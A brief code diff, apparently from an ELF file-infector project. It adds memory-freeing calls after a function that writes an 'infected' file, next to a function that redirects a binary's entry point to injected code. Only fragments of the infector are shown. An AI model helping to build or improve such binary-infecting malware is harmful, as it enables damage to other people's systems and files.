@@ -73,6 +73,9 @@ void insert(byte *dest, byte *src, uint64_t dest_size, uint16_t src_size) {
 	final_product[i] = dest[i];
     }
     write_file("infected", final_product, dest_size + src_size);
+
+    free(final_product);
+    free(src);
 }
 
 void add_jump(byte **payload_addr, uint16_t *size, Elf64_Addr new_entry, Elf64_Addr old_entry) {
